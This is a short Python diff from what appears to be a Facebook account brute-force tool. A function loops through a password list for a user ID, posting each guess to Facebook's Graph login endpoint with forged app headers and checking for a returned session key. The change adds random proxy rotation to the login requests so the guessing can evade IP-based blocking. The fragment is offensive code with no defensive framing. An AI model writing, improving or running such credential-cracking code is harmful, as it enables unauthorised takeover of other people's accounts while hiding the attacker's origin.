@@ -1537,6 +1537,8 @@ def x(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
             data = {
             'adid': str(uuid.uuid4()),
             'format': 'json',
@@ -1583,7 +1585,7 @@ def x(uid,pwx,tl):
             'X-Fb-Server-Cluster': 'True',
             'Content-Length': '847'}
             url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
+            result = requests.post(url, data=data, headers=headers, proxies=proxs).json()
             print(result)
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
